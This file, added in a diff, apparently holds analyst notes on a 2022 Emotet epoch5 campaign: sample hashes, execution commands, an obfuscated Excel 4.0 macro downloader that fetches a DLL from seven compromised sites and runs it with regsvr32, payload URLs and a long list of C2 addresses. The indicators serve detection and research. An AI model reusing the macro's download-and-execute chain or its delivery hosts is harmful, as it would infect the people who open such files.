@@ -1,0 +1,109 @@
+Emotet 2022 | epoch5 | 14.03.2022 | 
+
+************************************************************************************************************
+
+.zip 9C67A70AD63D8F2D08212459A916A8A8B55DF3AD213C49D3A0925C4FE64929C3
+.xls d6cce1253a27bc99afa262dd85822f5b17793b13b643171146b83b2594e14104
+.dll c69002b5871d3844a7a02cd03b765121e51a323f1b08f478393c1ac1f4ebc976
+
+************************************************************************************************************
+
+Exec >>
+
+EXCEL.EXE /dde C:\Users\Admin\AppData\Local\Temp\ESCANEAR 805426.xlsm
+
+regsvr32.exe -s ..\rds.ocx
+
+regsvr32.exe /s "C:\Windows\SysWOW64\Orunkony\qmhwaxf.ohk
+
+************************************************************************************************************
+
+Hidden Macro Sheet - Obfuscation 
+
+        =FORMULA('EV1'!D13,'EV2'!G3)=FORMULA(Dfvw!P22&Dfvw!H9&Dfvw!L2&Dfvw!B15&Dfvw!B15&Sheet!C10&Sheet!D7&Sheet!G5&'EV2'!G3&Dfvw!L2&Sheet!F13&Evwvev!M17&Sheet!E18&Evwvev!V15&Evwvev!I16,E8)=FORMULA(Dfvw!P22&Dfvw!J11&Dfvw!B18&Dfvw!P11&"CFTG1"&Evwvev!T5&Dfvw!H9&Dfvw!L2&Dfvw!B15&Dfvw!B15&Sheet!C10&Sheet!D7&Sheet!G5&'EV2'!G3&Dfvw!L2&Sheet!F13&Evwvev!M17&Sheet!F20&Evwvev!V15&Evwvev!I16&Dfvw!P13,E10)=FORMULA(Dfvw!P22&Dfvw!J11&Dfvw!B18&Dfvw!P11&"CFTG2"&Evwvev!T5&Dfvw!H9&Dfvw!L2&Dfvw!B15&Dfvw!B15&Sheet!C10&Sheet!D7&Sheet!G5&'EV2'!G3&Dfvw!L2&Sheet!F13&Evwvev!M17&Sheet!G18&Evwvev!V15&Evwvev!I16&Dfvw!P13,E12)=FORMULA(Dfvw!P22&Dfvw!J11&Dfvw!B18&Dfvw!P11&"CFTG3"&Evwvev!T5&Dfvw!H9&Dfvw!L2&Dfvw!B15&Dfvw!B15&Sheet!C10&Sheet!D7&Sheet!G5&'EV2'!G3&Dfvw!L2&Sheet!F13&Evwvev!M17&Sheet!H20&Evwvev!V15&Evwvev!I16&Dfvw!P13,E14)=FORMULA(Dfvw!P22&Dfvw!J11&Dfvw!B18&Dfvw!P11&"CFTG4"&Evwvev!T5&Dfvw!H9&Dfvw!L2&Dfvw!B15&Dfvw!B15&Sheet!C10&Sheet!D7&Sheet!G5&'EV2'!G3&Dfvw!L2&Sheet!F13&Evwvev!M17&Sheet!I18&Evwvev!V15&Evwvev!I16&Dfvw!P13,E16)=FORMULA(Dfvw!P22&Dfvw!J11&Dfvw!B18&Dfvw!P11&"CFTG5"&Evwvev!T5&Dfvw!H9&Dfvw!L2&Dfvw!B15&Dfvw!B15&Sheet!C10&Sheet!D7&Sheet!G5&'EV2'!G3&Dfvw!L2&Sheet!F13&Evwvev!M17&Sheet!J20&Evwvev!V15&Evwvev!I16&Dfvw!P13,E18)=FORMULA(Dfvw!P22&Dfvw!J11&Dfvw!B18&Dfvw!P11&"CFTG6"&Evwvev!T5&Dfvw!H9&Dfvw!L2&Dfvw!B15&Dfvw!B15&Sheet!C10&Sheet!D7&Sheet!G5&'EV2'!G3&Dfvw!L2&Sheet!F13&Evwvev!M17&Sheet!K18&Evwvev!V15&Evwvev!I16&Dfvw!P13,E20)=FORMULA(Dfvw!P22&Dfvw!J11&Dfvw!B18&Dfvw!P11&"CFTG7"&Evwvev!T5&Dfvw!H9&Dfvw!B15&Dfvw!I17&Dfvw!I3&Dfvw!H13&Dfvw!P11&Dfvw!K9&Dfvw!P13&Dfvw!P7&Dfvw!P13,E22)=FORMULA(Dfvw!P22&Dfvw!H13&Dfvw!N4&Dfvw!H13&Dfvw!H9&Dfvw!P11&Dfvw!P15&Dfvw!H9&Dfvw!P20&Evwvev!P12&Evwvev!Q8&Evwvev!L4&Sheet!R10&Evwvev!J10&Dfvw!P15&Dfvw!P13,E24)=FORMULA(Dfvw!P22&Dfvw!G24&Dfvw!H13&Dfvw!I26&Dfvw!E11&Dfvw!G24&Dfvw!K23&Dfvw!P11&Dfvw!P13,E30)
+        
+        =CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"tt"&"ps://as"&"ervon.c"&"o"&"m/css/Dha"&"DF"&"9VHo"&"ru"&"7/","..\rds.ocx",0,0)
+        
+        =IF(CFTG1<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"ht"&"tps://w"&"w"&"w.hih7.c"&"o"&"m/w"&"p-a"&"dm"&"in/nX8"&"WbaR"&"CZV"&"yV"&"Xi/","..\rds.ocx",0,0))
+        
+        =IF(CFTG2<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"ttp"&"s://af"&"riv"&"a"&"c.o"&"r"&"g/cs"&"s/sZq"&"qu3"&"mY"&"VH"&"FK/","..\rds.ocx",0,0))
+        
+        =IF(CFTG3<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"ttp"&"s://a-u-s.i"&"t/qL"&"oyJJF"&"V0"&"q6Z"&"2i/","..\rds.ocx",0,0))
+        
+        =IF(CFTG4<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"ht"&"tp"&"s://act"&"we"&"ll.fr/l"&"og"&"s/g2x"&"yR/","..\rds.ocx",0,0))
+        
+        =IF(CFTG5<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"ttps://w"&"ww.ac"&"tiv-s"&"hoes.r"&"o/w"&"p-inc"&"lud"&"es/7"&"Ob1"&"hpW"&"vAnp"&"R2f"&"K4/","..\rds.ocx",0,0))
+        
+        =IF(CFTG6<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"ttps://getl"&"ivet"&"ext.c"&"o"&"m/w"&"p-a"&"d"&"min/6Z"&"sA"&"Nn"&"00/","..\rds.ocx",0,0))
+        
+        =IF(CFTG7<0, CLOSE(0),)
+        
+        =EXEC("C:\Windows\SysWow64\r"&"eg"&"sv"&"r3"&"2.e"&"xe -s ..\rds.ocx")
+        
+        =RETURN()           
+                      
+
+************************************************************************************************************
+
+.dll distro
+
+https://aservon.com/css/DhaDF9VHoru7/
+https://www.hih7.com/wp-admin/nX8WbaRCZVyVXi/
+https://afrivac.org/css/sZqqu3mYVHFK/
+https://a-u-s.it/qLoyJJFV0q6Z2i/
+https://actwell.fr/logs/g2xyR/
+https://www.activ-shoes.ro/wp-includes/7Ob1hpWvAnpR2fK4/
+https://getlivetext.com/wp-admin/6ZsANn00/
+
+Network
+
+https://186.250.48.5:80/LSxoFWLAYJJNkorHgkrZryexWsnAlsIbfBsbxNayGXIKxkR
+https://139.196.72.155:8080/cXIBCpJHUBbUiITQuTtCoSMowsfChNbbCnQRUBLGUpqnVThyMTsGJtVqCx
+
+c2's
+
+51.75.33.122:443
+186.250.48.5:80
+168.119.39.118:443
+207.148.81.119:8080
+194.9.172.107:8080
+139.196.72.155:8080
+78.47.204.80:443
+159.69.237.188:443
+45.71.195.104:8080
+54.37.106.167:8080
+185.168.130.138:443
+37.44.244.177:8080
+185.184.25.78:8080
+185.148.168.15:8080
+128.199.192.135:8080
+37.59.209.141:8080
+103.41.204.169:8080
+185.148.168.220:8080
+103.42.58.120:7080
+78.46.73.125:443
+68.183.93.250:443
+190.90.233.66:443
+5.56.132.177:8080
+62.171.178.147:8080
+196.44.98.190:8080
+168.197.250.14:80
+66.42.57.149:443
+59.148.253.194:443
+104.131.62.48:8080
+191.252.103.16:80
+54.37.228.122:443
+88.217.172.165:8080
+195.77.239.39:8080
+116.124.128.206:8080
+93.104.209.107:8080
+118.98.72.86:443
+217.182.143.207:443
+87.106.97.83:7080
+210.57.209.142:8080
+54.38.242.185:443
+195.154.146.35:443
+203.153.216.46:443
+198.199.98.78:8080
+85.214.67.203:8080
+
